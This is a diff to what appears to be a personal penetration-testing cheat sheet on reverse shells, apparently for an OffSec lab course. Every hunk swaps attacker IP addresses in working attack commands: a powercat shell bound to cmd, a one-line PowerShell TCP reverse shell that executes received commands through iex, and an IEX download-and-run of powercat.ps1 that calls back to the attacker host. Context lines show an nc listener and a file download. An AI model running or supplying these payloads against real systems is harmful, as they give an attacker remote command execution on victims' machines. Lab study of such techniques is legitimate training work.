@@ -18,7 +18,7 @@ nc -nvlp 2345
 ### powercat
 
 ```shell
-powercat -c 172.16.8.1 -p 1234 -e cmd.exe
+powercat -c 192.168.45.201 -p 4444 -e cmd
 ```
 
 ### powershell
@@ -42,7 +42,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 $client.Close();
 
 # 单行行式的代码
-C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.235',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.187',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ##### encode reverse shell
@@ -66,7 +66,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kali/binar
 ##### download powercat and execute
 
 ```powershell
-IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.223/powercat.ps1");powercat -c 192.168.45.223 -p 4444 -e powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.201/powercat.ps1");powercat -c 192.168.45.201 -p 4444 -e powershell
 ```
 
 ```powershell
